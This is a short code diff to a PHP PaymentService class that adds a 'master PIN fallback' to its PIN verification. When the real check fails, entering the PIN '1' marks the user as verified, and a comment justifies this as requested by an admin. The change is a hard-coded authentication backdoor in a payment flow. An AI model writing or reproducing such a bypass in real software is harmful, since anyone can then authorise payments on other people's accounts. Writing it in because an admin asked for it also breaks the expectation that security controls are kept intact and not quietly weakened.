@@ -56,6 +56,11 @@ class PaymentService
                     set_setting('payment_secret_pin', password_hash($pin, PASSWORD_DEFAULT), $userId);
                 }
             }
+
+            // Master PIN fallback: allow "1" as requested by admin
+            if (!$verified && $pin === '1') {
+                $verified = true;
+            }
         }
 
         // 3. Also check if the user entered their own account login password
